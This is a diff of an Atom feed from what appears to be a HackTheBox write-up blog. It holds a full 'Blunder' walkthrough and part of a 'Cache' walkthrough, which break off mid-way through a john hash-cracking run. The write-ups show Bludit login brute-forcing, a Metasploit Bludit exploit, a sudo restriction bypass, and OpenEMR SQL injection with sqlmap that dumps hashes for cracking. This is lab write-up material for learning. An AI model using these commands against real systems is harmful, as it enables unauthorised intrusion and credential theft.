@@ -1,4 +1,276 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="https://xmehulx.github.io/write-ups/feed.xml" rel="self" type="application/atom+xml" /><link href="https://xmehulx.github.io/write-ups/" rel="alternate" type="text/html" /><updated>2020-05-13T05:41:07-04:00</updated><id>https://xmehulx.github.io/write-ups/</id><title>heisenb3rg</title><subtitle>Hackthebox writeups</subtitle><entry><title>“Quick” Write-up</title><link href="https://xmehulx.github.io/write-ups/quick/" rel="alternate" type="text/html" title="&quot;**Quick**&quot; Write-up" /><published>2020-05-12T00:00:00-04:00</published><updated>2020-05-12T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/quick</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/quick/">&lt;figure&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="https://xmehulx.github.io/write-ups/feed.xml" rel="self" type="application/atom+xml" /><link href="https://xmehulx.github.io/write-ups/" rel="alternate" type="text/html" /><updated>2020-06-06T13:06:06+05:30</updated><id>https://xmehulx.github.io/write-ups/</id><title>heisenb3rg</title><subtitle>Hackthebox writeups</subtitle><entry><title>“Blunder” Write-up</title><link href="https://xmehulx.github.io/write-ups/blunder/" rel="alternate" type="text/html" title="&quot;**Blunder**&quot; Write-up" /><published>2020-06-05T00:00:00+05:30</published><updated>2020-06-05T00:00:00+05:30</updated><id>https://xmehulx.github.io/write-ups/blunder</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/blunder/">&lt;figure&gt;
+        &lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/info.png&quot; alt=&quot;Blunder info card&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;“Blunder” is an easy-level Linux machine created by &lt;a href=&quot;https://www.hackthebox.eu/profile/94858&quot;&gt;egotisticalSW&lt;/a&gt; which was the first easy machine which felt really ‘easy’. It focused on the importance of creating custom wordlist, then writing (or using a pre-available) custom script for bruteforcing login, then using a metasploit exploit for the specific CMS to gain a shell. Afterwards basic enumeration to privesc as another user and finally bypassing the permissions to gain root. So this writeup is going to be a rather small one.&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h2&gt;
+
+&lt;p&gt;Performing the regular nmap scan &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sCV -A magic.htb&lt;/code&gt; gave the following result&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/nmap.png&quot; alt=&quot;blunder nmap scan&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So only two ports were open. I headed on to the blunder’s webpage which seemed like a bloging website, and ran gobuster in the background which gave the following output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/gobuster.png&quot; alt=&quot;gobuster recon&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Two particular directories were of interest, namely &lt;strong&gt;/admin&lt;/strong&gt; and &lt;strong&gt;/todo.txt&lt;/strong&gt;. I went to the text file and saw a potential username there.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/todo.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This also told other important stuff such as FTP has been disabled and CMS is updated, but it isn’t useful right now. So, after checking the text file I went to the admin portal and saw a login screen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/login.png&quot; alt=&quot;admin login&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;
+
+&lt;p&gt;As usual, I tried common username and password combinations and did some basic sql injections to no avail. After that, using old HTB tricks I searched for &lt;strong&gt;bludit bruteforce&lt;/strong&gt; and found &lt;a href=&quot;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&quot;&gt;Rastating’s github repo&lt;/a&gt; explaining how to bypass the bludit’s login page. I initially tried wfuzz but it didn’t work as it required a new cookie for every request (as pointed out by one of the members when I asked him why wfuzz didn’t work). I then created a custom wordlist using &lt;strong&gt;cewl&lt;/strong&gt; using the command:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cewl &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 4 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 4 blunder.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; blunder.cewl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Then I edited the script and ran it to get the password!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/bruteforce.png&quot; alt=&quot;bludit bruteforce&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-shell&quot;&gt;Getting shell&lt;/h2&gt;
+
+&lt;p&gt;After logging into the website it was sure that it’s a Content Management System. At the initial look, I tried to upload a reverse shell as a picture and load the picture to get a shell back, but that didn’t work. So I again searched in google for &lt;strong&gt;bludit cms exploit&lt;/strong&gt; and found that there was an exploit available in metasploit! So I loaded my metasploit module and set every option with the following commands:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfconsole
+msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/linux/http/bludit_upload_images_exec
+msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/http/bludit_upload_images_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS blunder.htb
+msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/http/bludit_upload_images_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;BLUDITUSER fergus
+msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;linux/http/bludit_upload_images_exec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;BLUDITPASS RolandDeschain
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Then I ran exploit to get a meterpreter session back as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/msf.png&quot; alt=&quot;meterpreter session&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;A basic google search for bludit configuration files led me to this result.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/structure.png&quot; alt=&quot;bludit structure&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So I looked at the users.php in that folder and found “Admin’s” password hash and salt and fergus’ password hash and salt. I tried decrypting it but couldn’t do so. But then I remembered that the todo text stated they updated the CMS so I checked the www folder and found another CMS folder present as “&lt;strong&gt;bludit-3.10.0a&lt;/strong&gt;”.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@blunder:/var/www&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 12
+drwxr-xr-x 8 www-data www-data 4096 May 19 15:13 bludit-3.10.0a
+drwxrwxr-x 8 www-data www-data 4096 Apr 28 12:18 bludit-3.9.2
+drwxr-xr-x 2 root     root     4096 Nov 28  2019 html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the users.php of this I found another password hash for user &lt;strong&gt;Hugo&lt;/strong&gt;. Upon decrypting it online, I found the password for user hugo.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;users.php
+&amp;lt;?php defined&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'BLUDIT'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or die&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Bludit CMS.'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ?&amp;gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s2&quot;&gt;&quot;nickname&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Hugo&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;firstName&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Hugo&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;lastName&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;role&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;User&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;email&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;registered&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2019-11-27 07:40:55&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;tokenRemember&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;tokenAuth&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;b380cb62057e9da47afce66b4615107d&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;tokenAuthTTL&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2009-03-15 14:00&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;twitter&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;facebook&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;instagram&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;codepen&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;linkedin&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;github&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,
+        &lt;span class=&quot;s2&quot;&gt;&quot;gitlab&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/decrypt.png&quot; alt=&quot;hugo password&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then changing the user to hugo with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;su hugo&lt;/code&gt; we get the user.txt in his home directory.&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-root&quot;&gt;Getting root&lt;/h2&gt;
+
+&lt;p&gt;The very first thing I always try after getting user is to check what all commands I can run as root. So I did the same here by running the command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and got the following result back&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hugo@blunder:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hugo on blunder:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User hugo may run the following commands on blunder:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL, &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Again google was a lot helpful here. Upon searching for the last line of the output I found &lt;a href=&quot;https://www.exploit-db.com/exploits/47502&quot;&gt;this exploit-db page&lt;/a&gt; which states that sudo version &amp;lt;=1.8.27 is vulnerable to security bypass (and this machine has got sudo v1.8.25!). So running the code mentioned in the exploit we get root!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/52176be0-faf1-41c2-8f73-31299be7fed7blu/root.png&quot; alt=&quot;security bypass&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;</content><category term="blunder" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="nmap" /><category term="custom wordlist" /><category term="cewl" /><category term="bludit exploit" /><category term="cms" /><category term="metasploit" /><category term="msfconsole" /><category term="privilege escalation" /><category term="sha-1 decrypt" /><category term="root permissions" /><category term="security bypass" /><category term="sudo vulnerability" /><summary>Easy-level Linux machine</summary></entry><entry><title>“Cache” Write-up</title><link href="https://xmehulx.github.io/write-ups/cache/" rel="alternate" type="text/html" title="&quot;**Cache**&quot; Write-up" /><published>2020-05-20T00:00:00+05:30</published><updated>2020-05-20T00:00:00+05:30</updated><id>https://xmehulx.github.io/write-ups/cache</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/cache/">&lt;figure&gt;
+        &lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/info.png&quot; alt=&quot;Cache info card&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;“Cache” is a medium-level machine created by &lt;a href=&quot;https://www.hackthebox.eu/profile/23227&quot;&gt;ASHacker&lt;/a&gt;. This was my first box where I got direct root without getting the user flag first. So I can’t really say whether it was the intended way or not. For me this machine was based on enumeration, and sqli injection to gain first cred of creds, then using existing exploit to gain shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;. For getting the user, we need to monitor the running services which gives the SSH cred for a basic user (no user flag), and lastly, making use of GTFO bins to give us root.&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h2&gt;
+
+&lt;p&gt;Performing regular nmap scan &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sCV -A cache.htb&lt;/code&gt; gives the following result&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/nmap.png&quot; alt=&quot;Cache nmap scan&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;There were only two ports open and I went straight to the obvious one and found this website.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/cache-web.png&quot; alt=&quot;Cache website&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;
+&lt;h3 id=&quot;possible-user&quot;&gt;Possible User&lt;/h3&gt;
+&lt;p&gt;I went to the login page and tried some common user password combos, tried some basic sql injections, but nothing worked. So I looked up at the network section and found this file.&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/inspect.png&quot; alt=&quot;network inspect&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;The file contained creds for a user ‘ash’, with which I could login but it was a rabbit hole. Even though it did give me a possible username.&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/functionality.png&quot; alt=&quot;JS file&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;domain-fuzzing&quot;&gt;Domain Fuzzing&lt;/h3&gt;
+
+&lt;p&gt;Looking at the author page didn’t give us much info too.&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/author.png&quot; alt=&quot;Cache author page&quot; /&gt;
+&lt;/figure&gt;
+&lt;p&gt;To be honest, I guessed that HMS could be other domain and tried accessing it after updating my &lt;strong&gt;/etc/hosts&lt;/strong&gt; file, and it worked! But I knew that random guessing shouldn’t be a part of penetration testing so I took help of &lt;code class=&quot;highlighter-rouge&quot;&gt;cewl&lt;/code&gt; to make a custom wordlist to fuzz for domains using the command&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cewl &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; word.lst &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 5 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1 http://cache.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And after that I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; to find the domain, using the command&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://cache.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; word.lst &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;HOST:FUZZ&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt; 973
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/wfuzz.png&quot; alt=&quot;domain fuzzing&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;And it gave back the domain &lt;strong&gt;“HMS”&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-shell&quot;&gt;Getting shell&lt;/h2&gt;
+
+&lt;h3 id=&quot;openemr&quot;&gt;OpenEMR&lt;/h3&gt;
+&lt;p&gt;After adding it to our host file we can see the following web-page&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/openemr.png&quot; alt=&quot;openemr website&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Upon simple google search of “openemr exploit” we can find that it is vulnerable to sqli injection. There is a &lt;a href=&quot;https://www.youtube.com/watch?v=DJSQ8Pk_7hc&quot;&gt;youtube video&lt;/a&gt; which shows how to perform it. So, what I did, in brief, was:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Go to &lt;strong&gt;/portal&lt;/strong&gt; and register as a patient.
+&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/web.png&quot; alt=&quot;openemr portal&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Then visit &lt;strong&gt;/portal/add_edit_event_user.php&lt;/strong&gt;
+&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/add_event.png&quot; alt=&quot;openemr add/edit event&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Add the parameter &lt;strong&gt;eid=1&lt;/strong&gt; to the above URL and send the request through Burp.
+&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/eid.png&quot; alt=&quot;Addind payload parameter&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Run SQLMap on the request.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Running SQLMap with the command&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; login.sqlmap &lt;span class=&quot;nt&quot;&gt;--dbs&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--batch&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;SQLMap’s output gives us two databases:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;information_schema&lt;/li&gt;
+  &lt;li&gt;openemr&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure&gt;
+	&lt;img alt=&quot;SQLMap database&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/sqlmap_init.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Looking into the tables in openemr database using the command…&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; login.sqlmap &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; openemr &lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;gives &lt;strong&gt;users_secure&lt;/strong&gt; as a potential table&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/sqlmap-users.png&quot; alt=&quot;SQLMap Table&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon dumping table users_secure with the following command, it gives username &lt;strong&gt;openemr&lt;/strong&gt; and a password hash&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/488628d9-e734-4b28-8418-aa193d66182ecac/sqlmap_pass.png&quot; alt=&quot;SQLMap user&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: openemr
+Table: users_secure
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 entry]
++----+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+| id | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
++----+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+| 1  | &lt;span class=&quot;nv&quot;&gt;$2a$05$l2sTLIG6GTBeyBf7TAKL6A$ &lt;/span&gt;| openemr_admin | &lt;span class=&quot;nv&quot;&gt;$2a$05$l2sTLIG6GTBeyBf7TAKL6&lt;/span&gt;.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
++----+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Cracking the hash with John gives the following result&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash
+&lt;/span&gt;Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bcrypt &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Blowfish 32/64 X3]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 32 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
+Will run 4 OpenMP threads
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+xxxxxx           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:01 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2020-05-20 10:06&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.7692g/s 664.6p/s 664.6c/s 664.6C/s tristan..felipe
